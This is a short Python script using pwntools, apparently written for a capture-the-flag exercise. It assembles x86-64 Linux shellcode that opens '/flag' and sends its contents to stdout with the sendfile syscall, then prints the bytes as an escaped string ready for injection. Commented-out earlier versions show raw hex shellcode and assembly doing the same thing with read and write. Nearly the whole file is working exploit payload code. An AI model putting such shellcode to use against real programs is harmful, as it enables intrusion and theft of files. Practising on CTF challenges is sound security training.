#char = "48b8 2f66 6c61 6700 0000 5048 89e7 48c7 c600 0000 0048 c7c0 0200 0000 0f05 4889 c748 89e6 48c7 c2e8 0300 0048 c7c0 00000000 0f05 48c7 c701 0000 0048 89e6 4889c248 c7c0 0100 0000 0f05 48c7 c72a 0000 0048 c7c0 3c00 0000 0f05"
#char = char.replace(" ", "")
#newChar = ""
#for i in range(len(char)):
#    if char[i] in ('\n', ' '):
#        continue
#    if i%2 == 0:
#        newChar = newChar + "\\x" 
#    newChar = newChar + char[i]
#
#print(newChar)

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

#assembly = """
#    mov rax, 0x0067616c662f
#    push rax
#
#    mov rdi, rsp
#    mov rsi, 0
#    mov rax, 2
#    syscall
#
#    mov rdi, rax
#    mov rsi, rsp
#    mov rdx, 1000
#    mov rax, 0
#    syscall
#
#    mov rdi, 1
#    mov rsi, rsp
#    mov rdx, rax
#    mov rax, 1
#    syscall
#
#    mov rdi, 42
#    mov rax, 60
#    syscall
#"""

#assembly = """
#mov rax, 0x67616c662f 
#push rax
#xor rax, rax         
#push rax
#
#mov rdi, rsp        
#mov rsi, 0         
#mov rax, 2        
#syscall
#
#test rax, rax
#js error                 
#
#mov rdi, rax             
#mov rsi, rsp             
#mov rdx, 1000           
#mov rax, 0             
#syscall
#
#mov rdi, 1            
#mov rsi, rsp         
#mov rdx, rax        
#mov rax, 1         
#syscall
#
#error:
#mov rdi, 42       
#mov rax, 60      
#syscall
#"""

assembly = """
    xor eax, eax
    mov eax, 2
    lea edi, [rip + path]
    xor esi, esi
    syscall
    xor edi, edi
    mov dil, 1
    xor esi, esi
    mov sil, al
    xor edx, edx
    mov r10, 128
    mov al, 40
    syscall
path:
    .string "/flag"
"""
shellcode = asm(assembly)

formattedShellCode = ''.join([f'\\x{byte:02x}' for byte in shellcode])

print(formattedShellCode)
